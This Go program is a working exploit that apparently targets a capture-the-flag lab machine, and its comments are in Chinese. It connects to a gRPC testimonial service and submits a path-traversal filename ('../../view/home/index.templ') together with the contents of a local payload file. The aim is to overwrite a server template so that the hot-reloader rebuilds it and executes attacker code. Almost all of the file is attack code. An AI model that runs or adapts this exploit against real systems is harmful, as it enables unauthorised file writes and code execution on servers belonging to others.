package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"time"

	"google.golang.org/grpc"

	pb "exploit/pb" // 假设你把 pb 放到 exploit/pb，module 名称是 exploit
)

const TARGET_ADDR = "10.10.10.10:50051" // <- 改成靶机 IP:PORT

func getClient() (pb.TestimonialClient, *grpc.ClientConn, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	conn, err := grpc.DialContext(ctx, TARGET_ADDR, grpc.WithInsecure(), grpc.WithBlock())
	if err != nil {
		return nil, nil, err
	}
	client := pb.NewTestimonialClient(conn)
	return client, conn, nil
}

func main() {
	client, conn, err := getClient()
	if err != nil {
		fmt.Println("Failed to connect to server:", err)
		return
	}
	defer conn.Close()

	// 读取要上传的 payload（模板）
	payload, err := ioutil.ReadFile("pwn.go") // 若你想用 pwn.go，把这里改为 "pwn.go"
	if err != nil {
		fmt.Println("Failed to read payload file:", err)
		return
	}

	// 目标路径：这个路径会被拼接到 "public/testimonials/%s"
	// 通过 ../ 可以跳出目录并写到项目源代码路径里（视权限而定）
	targetPath := "../../view/home/index.templ"

	fmt.Println("Sending testimonial ->", targetPath)

	_, err = client.SubmitTestimonial(context.Background(), &pb.TestimonialSubmission{
		Customer:    targetPath,
		Testimonial: string(payload),
	})
	if err != nil {
		fmt.Println("Failed to send testimonial:", err)
		return
	}

	fmt.Println("Sent payload. 如果 air 在运行，服务会触发 rebuild / reload。访问首页查看结果。")
}
